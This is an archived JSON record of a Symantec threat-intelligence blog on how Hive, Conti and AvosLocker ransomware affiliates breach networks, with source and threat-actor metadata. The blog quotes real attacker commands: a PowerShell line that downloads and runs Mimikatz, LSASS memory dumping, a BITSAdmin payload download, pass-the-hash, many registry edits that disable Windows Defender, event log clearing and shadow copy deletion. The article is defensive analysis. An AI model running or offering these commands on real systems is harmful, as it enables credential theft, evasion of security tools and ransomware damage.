{
    "id": "e9360b20-77fe-420e-83e3-fbfe91c984f5",
    "created_at": "2023-01-12T15:01:08.809965Z",
    "updated_at": "2025-03-27T02:09:17.992803Z",
    "deleted_at": null,
    "sha1_hash": "bccf85fcfa9666cee06f4ebe57540ebd0fd9ed60",
    "title": "2022-04-28 - Ransomware- How Attackers are Breaching Corporate Networks",
    "authors": "",
    "file_creation_date": "2022-05-28T03:42:52Z",
    "file_modification_date": "2022-05-28T03:42:52Z",
    "file_size": 333203,
    "plain_text": "# Ransomware: How Attackers are Breaching Corporate Networks\n\n**[symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker)**\n\nTargeted ransomware attacks continue to be one of the most critical cyber risks facing\norganizations of all sizes. The tactics used by ransomware attackers are continually evolving,\nbut by identifying the most frequently employed tools, tactics, and procedures (TTPs)\norganizations can gain a deeper understanding into how ransomware groups infiltrate\nnetworks and use this knowledge to identify and prioritize areas of weakness.\n\n[Symantec, a division of Broadcom Software, tracks various ransomware threats; however,](https://software.broadcom.com/)\nthe following three ransomware families are being observed in the majority of recent attacks:\n\nHive\nConti\nAvoslocker\n\nSimilar to many other ransomware families, Hive, Conti, and Avoslocker follow the\nransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware\noperators hire affiliates who are responsible for launching the ransomware attacks on their\nbehalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out\nby the ransomware operators.\n\nOnce initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a\nplethora of TTPs to help the operators achieve the following:\n\n\n-----\n\nGain persistence on the network\nEscalate privileges\nTamper with and evade security software\nLaterally move across the network\n\n### Initial Access\n\nAffiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of\ntechniques to gain an initial foothold on victim networks. Some of these techniques include:\n\nSpear phishing leading to the deployment of malware, including but not limited to:\n\nIcedID\nEmotet\nQakBot\nTrickBot\nTaking advantage of weak RDP credentials\nExploiting vulnerabilities such as:\n\nMicrosoft Exchange vulnerabilities - CVE-2021-34473, CVE-2021-34523, CVE2021-31207, CVE-2021-26855\nFortiGate firewall vulnerabilities - CVE-2018-13379 and CVE-2018-13374\nApache Log4j vulnerabily - CVE-2021-44228\n\nIn most cases, the spear-phishing emails contain Microsoft Word document attachments\nembedded with macros that lead to the installation of one of the previously mentioned\nmalware threats. In some instances, attackers use this malware to install Cobalt Strike,\nwhich is then used to pivot to other systems on the network. These malware threats are then\nused to distribute ransomware onto compromised computers.\n\n### Persistence\n\nAfter gaining initial access, Symantec has observed affiliates for all three ransomware\nfamilies using third-party software such as AnyDesk and ConnectWise Control (previously\nknown as ScreenConnect) to maintain access to victim networks. They also enable default\nRemote Desktop access in the firewall:\n\nnetsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes\n\nActors are also known to create additional users on compromised systems to maintain\naccess. In some instances we have seen threat actors add registry entries that allow them to\nautomatically log in when a machine is restarted:\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nDefaultUserName /t REG_SZ /d <user> /f\n\n\n-----\n\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v\nAutoAdminLogon /t REG_SZ /d 1 /f\n\n### Discovery\n\nDuring the discovery phase the ransomware actors try to sweep the victim’s network to\nidentify potential targets. Symantec has observed the aforementioned ransomware actors\nusing tools such as the following:\n\nADRecon - Gathers Active Directory information and generates a report\nNetscan - Discovers devices on the network\n\n### Credential Access\n\nMimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no\nexception. We have observed them using the PowerShell version of Mimikatz as well as the\nPE version of the tool. There are also instances where the threat actors directly load the\nPowerShell version of Mimikatz from GitHub repositories:\n\npowershell IEX((new-object\nnet.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/InvokeMimikatz.ps1'));Invoke-Mimikatz -DumpCreds\n\nIn addition to using Mimikatz, the threat actors have also taken advantage of the native\nrundll32 and comsvcs.dll combination to dump the LSASS memory:\n\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full\n\nAdversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract\ncredentials from the dump. In rare occasions they have also been observed using\ntaskmgr.exe to dump the LSASS memory and later using the dump to extract valuable\ncredentials.\n\n### Lateral Movement\n\nAttackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute\nthe ransomware on victim networks. We have also observed the attackers using several\nother techniques to laterally move across networks.\n\nPsExec\n\npsexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\\xxx.exe\n\nWMI\n\n\n-----\n\nwmic /node:@C:\\share$\\comps1.txt /user: user /password: password process call create\n\"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe\n%APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\"\n\nBITSAdmin\n\nbitsadmin /transfer debjob /download /priority\nnormal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll\n\nMimikatz\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm\nhash>\"\n\n### Defense Evasion\n\nAs with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper\nwith various security products that interfere with their goal. We have observed them meddling\nwith security services using the net, taskkill, and sccommands to disable or terminate them.\nIn some cases they also use tools like PC Hunterto end processes. They have also been\nseen tampering with various registry entries related to security products, since changes to\nthe registry entries can make those products inoperative.\n\nBoth Hive and AvosLocker have been observed attempting to disable Windows Defender\nusing the following reg.exe commands.\n\n**AvosLocker:**\n\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t\nREG_DWORD /d 1 /f\n\n**Hive:**\n\nreg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\"\n/t REG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t\nREG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v\n\"MpEnablePus\" /t REG_DWORD /d \"0\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f\n\n\n-----\n\nreg.exe add HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v\n\"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v\n\"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"SpynetReporting\" /t REG_DWORD /d \"0\" /f\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f\n\nreg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\"\n/v \"Start\" /t REG_DWORD /d \"0\" /f\n\nreg.exe add\n\"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t\nREG_DWORD /d \"0\" /f\n\nreg.exe delete\naHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run” /v\n“Windows Defender” /f\n\nreg.exe delete “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v “Windows\nDefender” /\n\nDisabling the default Windows firewall is also one of the techniques we have seen being\nused by these ransomware families:\n\nnetsh advfirewall set allprofiles state off\n\nTo cover their tracks on a victim system the actors may also clear the Windows event log:\n\nwevtutil.exe cl system\n\n\n-----\n\nwevtutil.exe cl security\n\nwevtutil.exe cl application\n\npowershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\"\n\n### Impact\n\nAdversaries tend to disable or tamper with operating system settings in order to make it\ndifficult for administrators to recover data. Deleting shadow copies is a common tactic threat\nactors perform before starting the encryption process. They perform this task by using tools\nlike Vssadmin or WMIC and running one of the following commands:\n\nvssadmin.exe delete shadows /all /quiet\n\nwmic.exe shadowcopy delete\n\nWe have also seen BCDEditbeing used to disable automatic system recovery and to ignore\nfailures on boot:\n\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\n\nbcdedit.exe /set {default} recoveryenabled no\n\nIn some instances the actors delete the safe mode settings in the registry to stop security\nproduct services from starting in safe mode:\n\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\<service> /f\n\n### Exfiltration\n\nAttackers commonly exfiltrate critical data from a victim’s environment before encrypting it.\nThey then use the stolen data in an attempt to extort a ransom from victims. We have\nobserved threat actors using the following cloud services to exfiltrate data:\n\nhttps://anonfiles.com\nhttps://mega.nz\nhttps://send.exploit.in\nhttps://ufile.io\nhttps://www.sendspace.com\n\nWe have also seen attackers use the following tools for data exfiltration:\n\nFilezilla\nRclone\n\n### Conclusion\n\n\n-----\n\nThe TTPs outlined in this blog are a snapshot of the current ransomware threat landscape.\nThe TTPs used by these threat actors are constantly evolving, with groups continually\ntweaking their methods in a bid to outmaneuver their targets’ security defenses. As such,\norganizations need to be vigilant and employ a multi-layered security approach.\n\n### Symantec Protection\n\nSymantec Endpoint Protection (SEP) protects against ransomware attacks using multiple\nstatic and dynamic technologies.\n\n**AV Protection**\n\nRansom.Hive\nRansom.Conti\nRansom.AvosLocker\nBackdoor.Cobalt\nHacktool.Mimikatz\nTrojan.IcedID*\nTrojan.Emotet*\nW32.Qakbot*\nTrojan.Trickybot*\n\n**Behavioral Protection**\n\nSONAR.RansomHive!g2\nSONAR.RansomHive!g3\nSONAR.RansomHive!g4\nSONAR.RansomAvos!g2\nSONAR.RansomConti!g1\nSONAR.RansomConti!g3\nSONAR.RansomConti!g4\nSONAR.Ransomware!g30\nSONAR.RansomGregor!g1\nSONAR.SuspLaunch!gen4\nSONAR.SuspLaunch!g18\nSONAR.Ransom!gen59\nSONAR.Ransomware!g26\nSONAR.Cryptlck!g171\n\n**Intrusion Prevention System (IPS) detections**\n\nIPS [blocks initial access, persistence, and lateral movement. SEP's Audit Signatures are](https://www.broadcom.com/support/security-center/protection-bulletin#blt62c4475cd8c3573a_en-us)\nintended to raise awareness of potentially unwanted traffic on the network. By default, Audit\nSignatures do not block. Administrators reviewing the logs of IPS events in their network can\n\n\n-----\n\nnote these Audit events and decide whether or not to configure the corresponding Audit\nSignatures to block the traffic.\n\nThe following is a list of Audit Signatures that can be enabled to block, through policies,\nactivity related to the use of software or tools such as AnyDesk, ScreenConnect, and\nPsExec.\n\nSymantec recommends that you have intrusion prevention enabled on all your devices\nincluding servers.\n\n**Adaptive Protection**\n\n[Symantec Adaptive Protection can help protect against lateral movement and ransomware](https://techdocs.broadcom.com/us/en/symantec-security-software/endpoint-security-and-management/endpoint-protection/all/how-interacts-with-the-cloud-console-v122782854-d73e81/Adaptive-Protection.html)\nexecution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and\nBITSAdmin in your environment then you should “Deny” these applications and actions using\nSymantec Adaptive Protection policies.\n\n## About the Author\n\n### Karthikeyan C Kasiviswanathan\n\n**Principal Threat Analysis Engineer**\n\nKarthikeyan is a member of Symantec’s Security Technology and Response team which is\nfocused on providing round-the-clock protection against current and future cyber threats.\n\n## About the Author\n\n### Vishal Kamble\n\n**Principal Threat Analysis Engineer**\n\n\n-----\n\nVishal is member of Symantec s Security Technology and Response team where he is\nfocused on researching future cyber threats.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-28 - Ransomware- How Attackers are Breaching Corporate Networks.pdf"
    ],
    "report_names": [
        "2022-04-28 - Ransomware- How Attackers are Breaching Corporate Networks.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535668,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653709372,
    "ts_modification_date": 1653709372,
    "files": {
        "pdf": "https://archive.orkl.eu/bccf85fcfa9666cee06f4ebe57540ebd0fd9ed60.pdf",
        "text": "https://archive.orkl.eu/bccf85fcfa9666cee06f4ebe57540ebd0fd9ed60.txt",
        "img": "https://archive.orkl.eu/bccf85fcfa9666cee06f4ebe57540ebd0fd9ed60.jpg"
    }
}